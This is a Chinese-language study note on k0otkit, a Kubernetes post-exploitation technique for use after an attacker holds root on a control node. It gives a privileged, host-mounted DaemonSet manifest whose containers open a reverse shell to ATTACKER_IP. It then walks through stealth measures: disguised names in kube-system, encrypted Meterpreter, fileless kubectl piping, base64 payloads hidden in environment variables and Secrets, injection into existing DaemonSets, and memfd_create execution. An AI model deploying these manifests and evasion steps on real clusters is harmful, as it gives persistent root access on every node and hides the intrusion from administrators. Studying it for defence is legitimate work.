# k0otkit
绿盟开发,
场景为已经造成了控制节点的容器逃逸，获取了控制节点的root权限,然后进行后渗透利用

## 基本思路
k8s存在名叫DaemonSet的资源，他能够确保全部节点上运行一个pod的副本，当有节点加入集群的时候，也会为听他们新增一个Pod

DaemonSet对于渗透测试很有价值:
1. 能够确保所有节点上都运行一个Pod
2. 如果有Pod退出，DaemonSet将在对应节点上自动重建一个Pod

因此如果利用管理员凭证在目标集群创建一个内容为反弹shell的DaemonSet,我们就可以实现集群所有节点自动化反弹shell

## 基本实现
将DaemonSet创建的Pod启动命令设置为反弹shell即可,但仅仅如此也是不够的
我们需要在这个容器上打破隔离，需要以下几点
1. 特权容器，相当于docker run的时候加上`-privileged`选项
2. 容器与宿主机共享PID命名空间
3. 容器内挂载宿主机根目录

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: attacker
spec:
  selector:
    matchLabels:
      app: attacker
  template:
    metadata:
      labels:
        app: attacker
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: main
        image: bash
        imagePullPolicy: IfNotPresent
        command: ["bash"]
        # reverse shell
        args: ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"]
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host-root
      volumes:
      - name: host-root
        hostPath:
          path: /
          type: Directory
```

然后利用容器逃逸的`kubectl apply -f k0otkit.yaml`来实现该功能

然后绿盟的研究员也对该yaml进行了迭代更新，使得能让其增加隐蔽性

## 删除敏感词
名称和标签切换为`kube-cache, kube-metrics`这种，可以极大减少怀疑
此外由于管理员执行命令`kubectl get pods`就可以查看节点

所以这里同样考虑将`DaemonSet`资源创建在`kube-system`系统命名空间下，这样运行上面的命令就查看不到异常资源，
而在正常运行k8s的集群下，查看kube-system命名空间的资源状态需求也很少，这样就提高了隐蔽性
```yaml
metadata:
    name: attacker
    namespace: kube-system
    # ...
```
## 替换shell为Meterpreter
上面的yaml是基于bash的TCP协议反弹shell
由于他是明文，所以可能被网络入侵检查系统轻易检测从而触发警告

利用metasploit项目来生成加密反弹shell流量的二进制文件mrt

## 无文件化
上面的构建面临以下问题:
1. 在控制节点上面我们会创建一个本地yaml文件，本地创建文件可能会引起文件监控系统的告警
2. 并且需要二进制程序mrt为启动命令构建容器镜像,自行Meterpreter构建镜像动静太大,远程拉外部镜像容易引起告警

第一个问题的皆解决办法就是使用Linux命令行管道

```sh
cat << EOF | kubectl apply -f -
# {YAML文件内容}
EOF
```
这行命令就是使用cat获取多行输入,结尾用EOF表示，再将cat的输出用管道重定向到`kubectl apply -f -`命令
这样就不需要要创建本地yaml文件


第二个问题,将二进制Meterpreter编码为可见字符串，然后以环境变量的形式存放在DaemonSet的Yaml中
容器运行起来再从中读取字符串解码并保存为二进制文件

```YAML
# ......
      containers:
      - name: main
        image: bash
        imagePullPolicy: IfNotPresent
        command: ["bash"]
        args: ["-c", "echo -ne $(echo $PAYLOAD | base64 -d) > mrt; chmod u+x mrt; ./mrt"]
        env:
        - name: PAYLOAD
          value: "{PAYLOAD_VALUE}"
# .....
```

## 分离payload

编码后的Meterpreterr过长，容易被视作异常
k8s有一类名为Secret的资源，用来存储敏感信息，可以存入很长的字符串

```sh
secret_name=proxy-cache
secret_data_name=content

cat << EOF | kubectl --kubeconfig /root/.kube/config apply -f -
apiVersion: v1
kind: Secret
metadata:
  name: $secret_name
  namespace: kube-system
type: Opaque
data:
  $secret_data_name: {PAYLOAD_VALUE_BASE64}
EOF
```
另外需要修改DaemonSet的YAML,将上面secret以环境变量形式加载到容器内部

## 动态容器注入
如果管理员认真查看`kube-system`命名空间下的资源，k0otkit将直接暴露
所以这里采用将恶意容器注入到集群已有的DaemonSet中，这样就不必额外创建DaemonSet资源

## 解决镜像依赖
通过注入目标来确定修改的恶意容器启动命令

## 无文件攻击
由于容器启动后还是会通过yaml文件创建恶意二进制程序，因此上面的问题并不是完整的无文件攻击，这里使用linux提供的系统调用`memfd_create`,而这个系统调用是创建一个内存文件，然后向其中填入内容，最终执行该文件




# 参考
[https://blog.nsfocus.net/k0otkithack-k8s-in-a-k8s-way/](https://blog.nsfocus.net/k0otkithack-k8s-in-a-k8s-way/)
[内核信息取证](https://www.youtube.com/watch?v=6oe7qL7-WoI)
[使用rootkit隐藏蜜罐](https://www.sciencedirect.com/science/article/abs/pii/S1084804523000255)
[eBPF版本的rootkit实现](https://www.youtube.com/watch?v=g6SKWT7sROQ)
[eBPF enemy](https://www.youtube.com/watch?v=Q8eY67hDvkc)








